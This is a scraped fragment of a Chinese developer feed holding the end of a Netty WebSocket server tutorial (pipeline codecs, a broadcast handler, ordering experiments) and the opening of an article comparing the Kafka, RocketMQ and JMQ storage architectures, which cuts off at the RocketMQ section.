<p>引导类同样是<code>io.netty.bootstrap.ServerBootstrap</code>，和TCP协议的服务端一样，但是细节不同。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
<span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();

<span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">serverBootstrap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
serverBootstrap.group(bossGroup, workGroup);
serverBootstrap.channel(NioServerSocketChannel.class);
</code></pre>
<p>保活的配置一般会有心跳的代替，所以一般也就没有要设置了。线程组可以根据需要设置，一个接收任务，一个处理任务分工协作。</p>
<h3 data-id="heading-3">2.2 编解码器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ChannelPipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> socketChannel.pipeline();
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerCodec</span>());
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpObjectAggregator</span>(<span class="hljs-number">65535</span>));
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServerProtocolHandler</span>(<span class="hljs-string">"/testWs"</span>));
<span class="hljs-comment">// 自定义的handler，处理业务逻辑</span>
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebBusinessHandler</span>(channelGroup));
</code></pre>
<p>编解码同样是WebSocket中的重要配置类。<code>WebSocket</code>握手阶段需要遵守<code>HTTP</code>协议，自然少不了请求请求的解码以及响应的解码。Netty框架本身就提供了这样的编解码器：</p>
<ul>
<li><code>io.netty.handler.codec.http.HttpRequestDecoder</code>：请求解码器</li>
<li><code>io.netty.handler.codec.http.HttpResponseEncoder</code>：响应编码器</li>
</ul>
<p>配置这样的编解码器自然没有问题。然而Netty框架还提供了更加简便的二合一编解码器：</p>
<ul>
<li><code>io.netty.handler.codec.http.HttpServerCodec</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecc185516cbc4f71855fef71a27fc8a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=n3YSCX%2FWKLenhaIGA5XyKAeSf8s%3D" alt="" loading="lazy"/></p>
<p>注释中已经说明<code>HttpServerCodec</code>是<code>HttpRequestDecoder</code>和<code>HttpResponseEncoder</code>的结合。所以我们直接用它即可。</p>
<p>解码之后的数据分成两部分：</p>
<ul>
<li><code>HttpMessage</code>：包含HTTP请求的通用信息</li>
<li><code>LastHttpContent</code>：最新具有标记的<code>HttpContent</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d7dd2afa2c44f60ad7255e748148164~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=meGf02r4cwC6tsQSSmC63YgqkNY%3D" alt="" loading="lazy"/></p>
<p><code>io.netty.handler.codec.http.HttpObjectAggregator</code>是一个HTTP聚合器，可以将<code>HttpMessage</code>和<code>HttpContent</code>聚合成<code>FullHttpRequest</code>或<code>FullHttpResponse</code>。</p>
<p>案例也给除了用在<code>HttpServerCodec</code>之后。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f3de8b6ed8141f9be0f55fcc4d7b7b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=t%2F0h6KEmcob3y5ap9BF8EoBz4ec%3D" alt="" loading="lazy"/></p>
<p><code>io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler</code>专门处理WebSocket握手和帧，参数表示WebSocket路径。</p>
<p>这里所说的帧就是<code>WebSocketFrame</code>，主要常用的帧：</p>
<ul>
<li><code>TextWebSocketFrame</code>：处理文本</li>
<li><code>PingWebSocketFrame</code>：握手请求</li>
<li><code>PongWebSocketFrame</code>：握手响应</li>
<li><code>BinaryWebSocketFrame</code>：处理二进制</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0902fa4bd74c4d6b9aa65ff8f1737cdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=cmg4nuwOWiGk3HXfTQl0yAMzRt8%3D" alt="" loading="lazy"/></p>
<p>我们常用的是<code>TextWebSocketFrame</code>文本帧。</p>
<h3 data-id="heading-4">2.3 自定义处理器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebBusinessHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleChannelInboundHandler</span>&lt;TextWebSocketFrame&gt; {

    <span class="hljs-keyword">private</span> ChannelGroup channelGroup;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WebBusinessHandler</span><span class="hljs-params">(ChannelGroup channelGroup)</span> {
        <span class="hljs-built_in">this</span>.channelGroup = channelGroup;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlerAdded</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 建立客户端</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
        log.info(<span class="hljs-string">"客户端建立连接：channelId={}"</span>, channel.id());
        channelGroup.add(channel);

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlerRemoved</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 断开链接</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
        log.info(<span class="hljs-string">"客户端断开连接：channelId={}"</span>, channel.id());
        channelGroup.remove(channel);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, TextWebSocketFrame msg)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 接受消息</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
        log.info(<span class="hljs-string">"收到来自通道channelId[{}]发送的消息：{}"</span>, channel.id(), msg.text());

        <span class="hljs-comment">// 广播通知所有的客户端</span>
        channelGroup.writeAndFlush(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextWebSocketFrame</span>(<span class="hljs-string">"收到来自channelId["</span> + channel.id() + <span class="hljs-string">"]发送的消息："</span> + msg.text() + <span class="hljs-string">"123_"</span>));
    }
}
</code></pre>
<p>里面的方法和TCP协议的一致。但是要说明的就是里面的参数</p>
<p><code>io.netty.channel.group.ChannelGroup</code></p>
<p>这是一个Channel的通道组，用来管理所有的通道，包括通道的新增、剔除以及消息的发送。</p>
<p><code>SimpleChannelInboundHandler</code>的泛型我们限制为<code>TextWebSocketFrame</code>，否则获取到的消息就是<code>FullHttpRequest</code>类型。</p>
<p>消息发送时，同样使用的<code>TextWebSocketFrame</code>文本帧。</p>
<h3 data-id="heading-5">2.4 其他编解码</h3>
<p>在<code>HttpServerCodec</code>和<code>HttpObjectAggregator</code>之间还可以加入两个处理器：</p>
<ul>
<li><code>ObjectEncoder</code></li>
<li><code>ChunkedWriteHandler</code></li>
</ul>
<p><code>ObjectEncoder</code>是为了将<code>Java</code>对象序列化成<code>ByteBuf</code>。</p>
<p><code>ChunkedWriteHandler</code>增加了对异步写入大型数据流的支持，既不会花费大量内存，也不会获得<code>OutOfMemoryError</code>。</p>
<h3 data-id="heading-6">2.5 绑定端口</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 配置完成，开始绑定server，通过调用sync同步方法阻塞直到绑定成功</span>
<span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> serverBootstrap.bind(<span class="hljs-number">9090</span>).sync();
log.info(<span class="hljs-string">"Server started and listen on:{}"</span>,channelFuture.channel().localAddress());
<span class="hljs-comment">// 对关闭通道进行监听</span>
channelFuture.channel().closeFuture().sync();
</code></pre>
<p>这个之前已经讲过，这里不在赘述。</p>
<h2 data-id="heading-7">03 测试</h2>
<p>测试的之后，我们采用在线WebSocketk客户端：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebfem.com%2Ftools%2Fws%2Findex.html" target="_blank" title="https://webfem.com/tools/ws/index.html" ref="nofollow noopener noreferrer">webfem.com/tools/ws/in…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/361ffaa92f874102b4166bd97fff30b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=W6yB0R7fBkJ%2Bfu4igCm6ra3pPfM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">3.1 试错01</h3>
<p>因为我们之前在自定义处理器的泛型是<code>TextWebSocketFrame</code>，我们改成<code>Object</code>，看看默认的类型到底是什么？发送数据我们也采用直接发送的形式，看看能否成功？</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, Object msg)</span> <span class="hljs-keyword">throws</span> Exception {
    log.info(<span class="hljs-string">"msg类型:{}"</span>, msg.getClass());
    <span class="hljs-comment">// 接受消息</span>
    <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
    log.info(<span class="hljs-string">"收到来自通道channelId[{}]发送的消息：{}"</span>, channel.id(), msg);

    <span class="hljs-comment">// 广播通知所有的客户端</span>
    channelGroup.writeAndFlush(<span class="hljs-string">"收到来自channelId["</span> + channel.id() + <span class="hljs-string">"]发送的消息："</span> + msg + <span class="hljs-string">"123_"</span>);
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c11b5eaac2ea42c6912b94603ae569dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=zzKMPnK63HCTDTsjZCaKnntLFZg%3D" alt="" loading="lazy"/></p>
<p>我们可以看到，发出去的消息没有响应。打印<code>Msg</code>类型确实是<code>io.netty.handler.codec.http.websocketx.TextWebSocketFrame</code>。服务端像客户端发送的消息客户端也没有收到。</p>
<h3 data-id="heading-9">3.2 试错02</h3>
<p>我们知道编解码是顺序执行的。有没有和我一样，有这样的疑问:</p>
<p><code>WebSocketServerProtocolHandler</code>有没有可能不受顺序的影响，因为它是一个路径，我们改变一下试试。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65c045c5f4b5431999cf8965862d33f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=kFUxEySdsXQkVkps%2Fc36b4SCYew%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43c0de8d42a94bd0948c0956f1fb73c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=HsFKnjf5T6T4wESN6WKCQodMT8A%3D" alt="" loading="lazy"/></p>
<p><strong>效果：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fed0571328be42aba536d373a852f67d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=ZBIjKIeySPxF8qi0AwcqMLd8U4o%3D" alt="" loading="lazy"/></p>
<p>结果肯定是不行的，从报错信息来看，<code>WebSocketServerProtocolHandler</code>不仅提供了连接的路径，还对<code>ByteBuf</code>做了一定的转化。顺序不可妄动。</p>
<h2 data-id="heading-10">04 小结</h2>
<p>到这里WebSocket的服务端的内容就差不多了，本节的客户端采用了网上在线工具。下一节我们将通过两种方式手搓客户端连接我们的<code>WebSocket</code>服务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[工程师之夜系列分享第三十九篇：Kafka、RocketMQ、JMQ 存储架构深度对比]]></title>    <link>https://juejin.cn/post/7594576956420079642</link>    <guid>https://juejin.cn/post/7594576956420079642</guid>    <pubDate>2026-01-13T06:08:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594576956420079642" data-draft-id="7594415509607301166" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="工程师之夜系列分享第三十九篇：Kafka、RocketMQ、JMQ 存储架构深度对比"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-13T06:08:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            工程师之夜系列分享第三十九篇：Kafka、RocketMQ、JMQ 存储架构深度对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T06:08:39.000Z" title="Tue Jan 13 2026 06:08:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：毕源泉</p>
<h2 data-id="heading-0"><strong>引言</strong></h2>
<p>消息队列的存储架构是决定其可靠性、吞吐量、延迟性能的核心因素，直接影响业务场景适配能力。本文聚焦三款主流消息队列 ——Kafka（LinkedIn 开源，侧重高吞吐）、RocketMQ（阿里开源，金融级特性突出）、JMQ（京东开源，侧重高可用与灵活性），从存储模型、数据组织、索引设计等维度展开深度对比，为技术选型与架构优化提供参考。​</p>
<p>本文将从概念辨析出发，系统拆解主流存储模型与存储引擎的设计逻辑，对比 JMQ、Kafka、RocketMQ的技术选型差异与架构设计。​</p>
<h2 data-id="heading-1"><strong>一、</strong> Kafka存储架构</h2>
<h3 data-id="heading-2">1.1 核心存储模型：分区日志流</h3>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee01ba5da3c1475592f077f908a2456c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=c7Oq0C14wEkUNI8E%2FC53PX7fpBw%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p><strong>Topic - 主题</strong></p>
<p>Kafka学习了数据库里面的设计，在里面设计了topic（主题），这个东西类似于关系型数据库的表，此时我需要获取中国移动的数据，那就直接监听中国移动订阅的Topic即可。</p>
<p><strong>Partition - 分区</strong></p>
<p>Kafka还有一个概念叫Partition（分区），分区具体在服务器上面表现起初就是一个目录，一个主题下面有多个分区，这些分区会存储到不同的服务器上面，或者说，其实就是在不同的主机上建了不同的目录。这些分区主要的信息就存在了.log文件里面。跟数据库里面的分区差不多，是为了提高性能。</p>
<p>至于为什么提高了性能，很简单，多个分区多个线程，多个线程并行处理肯定会比单线程好得多。</p>
<p>Topic和partition像是HBASE里的table和region的概念，table只是一个逻辑上的概念，真正存储数据的是region，这些region会分布式地存储在各个服务器上面，对应于kafka，也是一样，<strong>Topic也是逻辑概念，而partition就是分布式存储单元。这个设计是保证了海量数据处理的基础。我们可以对比一下，如果HDFS没有block的设计，一个100T的文件也只能单独放在一个服务器上面，那就直接占满整个服务器了，引入block后，大文件可以分散存储在不同的服务器上。</strong></p>
<p><strong>注意：</strong></p>
<p>1.分区会有单点故障问题，所以我们会为每个分区设置副本数</p>
<p>2.分区的编号是从0开始的</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66333a00a3d94c1185c3fb0de363a34c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=rCTx8tpxHS4Xca00NsI9U2qqjps%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>Kafka 以「主题（Topic）- 分区（Partition）」为核心组织数据，每个分区本质是一个 append-only 的日志流，消息按生产顺序追加存储，保证分区内消息有序性。​</p>
<p><strong>优点：</strong> 可以充分利用磁盘顺序读写高性能的特性。存储介质也可以选择廉价的SATA磁盘，这样可以获得更长的数据保留时间、更低的数据存储成本。</p>
<h3 data-id="heading-3">1.2 数据组织：分段日志文件</h3>
<p>•每个分区拆分为多个 Segment 文件（默认 1GB），命名格式为「起始偏移量.log」（如 00000000000000000000.log）​，做这个限制目的是为了方便把.log加载到内存去操作</p>
<p>•配套两类索引文件：.index（偏移量→物理地址映射）、.timeindex（时间戳→偏移量映射）​​</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/730b9896bc594900819a3c86d89efefc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=ivaklGaephzfSavNgncXwrI4Uqw%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>这个9936472之类的数字，就是代表了这个日志段文件里包含的起始offset，也就说明这个分区里至少都写入了接近1000万条数据了。</p>
<p>Kafka broker有一个参数，log.segment.bytes，限定了每个日志段文件的大小，最大就是1GB，一个日志段文件满了，就自动开一个新的日志段文件来写入，避免单个文件过大，影响文件的读写性能，这个过程叫做log rolling，正在被写入的那个日志段文件，叫做active log segment。</p>
<h3 data-id="heading-4">1.3 消息读/写过程</h3>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c84e19c96cd441e69db4281f4fe824fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=JLf0F8dw%2BzGIXqtM%2BLD0qwIJdpg%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p><strong>写消息：</strong></p>
<p>•Index文件写入，Index文件较小，可以直接用mmap进行内存映射，避免频繁的磁盘I/O操作，提高写入性能；由于Index文件是稀疏索引，只需要记录关键位置的偏移量，因此即使使用mmap，写入的开销也相对较低。</p>
<p>•Segment文件写入，Segment文件较大，可以采用普通的写操作（FileChannel.write），由于Segment文件是顺序写入的，并且Kafka会利用操作系统的PageCache（页缓存）机制，写入操作会先写入到内存中，然后由操作系统在后台异步刷新到磁盘，可以进一步提高写入的性能。</p>
<p><strong>读消息：</strong></p>
<p>•Index文件读取，通常使用mmap方式读取，由于Index文件较小，且是稀疏索引，缺页中断的可能性较小。</p>
<p>•Segment文件读取，通常使用sendfile系统调用来实现零拷贝读取和发送，减少数据在用户空间与内核空间之间的拷贝次数，提高数据传输的效率。</p>
<h3 data-id="heading-5">1.4 关键技术</h3>
<p>Kafka 作为高性能的消息中间件，其超高吞吐量的核心秘诀之一就是<strong>深度依赖 PageCache + 顺序 I/O + mmap 内存映射</strong>的组合。</p>
<p>PageCache，中文名称为页高速缓冲存储器。它是将磁盘上的数据加载到内存中，当系统需要访问这些数据时，可以直接从内存中读取，而不必每次都去读取磁盘。这种方式显著减少了磁盘I/O操作，从而提高了系统性能。</p>
<p>mmap（Memory-mapped file）是操作系统提供的一种将<strong>磁盘文件</strong>与<strong>进程虚拟地址空间</strong>建立映射关系的核心技术，本质是让进程通过直接操作内存地址的方式读写文件，无需传统的 read/write 系统调用。核心价值在于<strong>零拷贝</strong>和<strong>内存式文件访问</strong>，尤其适合大文件、高吞吐、随机访问的场景。</p>
<p>将日志段（.log）文件映射到内存，生产者写入时直接写内存（内核异步刷盘），消费者读取时直接从内存读取，实现超高吞吐（Kafka 的 “顺序写 + mmap” 是其高性能核心）；</p>
<p>﻿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8025311968154f9e8ca20594c637af59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889319&amp;x-signature=FWIUrpjyB8hG3B%2BMusGW%2Fn5KiJ4%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>零拷贝流程示意图</p>
<p>零拷贝过程：</p>
<p>1.用户进程发起sendfile系统调用，<strong>上下文（切换1）从用户态转向内核态</strong></p>
<p>2.DMA控制器，把数据从硬盘中拷贝到内核缓冲区。</p>
<p>3.CPU将读缓冲区中数据拷贝到socket缓冲区</p>
<p>4.DMA控制器，异步把数据从socket缓冲区拷贝到网卡，</p>
<p>5.<strong>上下文（切换2）从内核态切换回用户态</strong>，sendfile调用返回。</p>
<h3 data-id="heading-6">1.5 设计优势</h3>
<p>•顺序写磁盘：Segment 文件仅追加写入，规避随机 IO，吞吐量极高（单分区可达 10 万 + TPS）​​</p>
<p>•索引轻量化：仅维护偏移量与时间戳索引，降低存储开销​</p>
<p>•副本同步：基于 ISR 机制，仅同步已提交消息，兼顾一致性与可用性</p>
<h2 data-id="heading-7">二、RocketMQ存储架构</h2>
<p>Kafka的每个Partition都是一个完整的、顺序写入的文件，但当Partition数量增多时，从操作系统的角度看，这些写入操作会变得相对随机，这可能会影响写入性能。</p>
<h3 data-id="heading-8">2.1 核心存储模型：分离式设计</h3>
